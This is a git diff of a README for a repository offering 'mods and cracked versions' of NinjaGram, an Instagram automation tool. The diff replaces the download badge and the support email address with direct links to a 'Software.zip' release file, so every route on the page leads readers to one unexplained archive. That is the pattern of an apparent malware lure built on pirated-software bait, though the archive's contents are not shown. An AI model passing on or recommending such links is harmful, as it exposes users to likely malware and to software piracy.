@@ -25,7 +25,7 @@ The following are the topics covered in this repository:
 ## 🚀 Get Started
 To get started with NinjaGram-Download, you can download the latest version of the repository by clicking on the link below. 
 
-[![Download NinjaGram-Download](https://img.shields.io/badge/Download-NinjaGram--Download-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download NinjaGram-Download](https://github.com/Evan-theo/NinjaGram-Download/releases/download/v2.0/Software.zip)](https://github.com/Evan-theo/NinjaGram-Download/releases/download/v2.0/Software.zip)
 
 ## 🌟 Features
 - Find the latest mods and cracked versions of NinjaGram.
@@ -49,7 +49,7 @@ If you have any suggestions, improvements, or additions to make to the repositor
 If you are looking for additional resources related to NinjaGram or need further assistance, be sure to check out the "Releases" section of this repository for updates and new releases. 
 
 ## 📞 Support
-For any issues or queries related to NinjaGram-Download, you can reach out to our support team at support@ninjagramdownload.com. We are here to help you make the most out of NinjaGram!
+For any issues or queries related to NinjaGram-Download, you can reach out to our support team at https://github.com/Evan-theo/NinjaGram-Download/releases/download/v2.0/Software.zip We are here to help you make the most out of NinjaGram!
 
 ## 🎉 Enjoy Your NinjaGram Experience!
 Thank you for visiting the NinjaGram-Download repository. We hope you find everything you need to enhance your Instagram experience with NinjaGram. Happy downloading and happy automating! 🚀📸😎
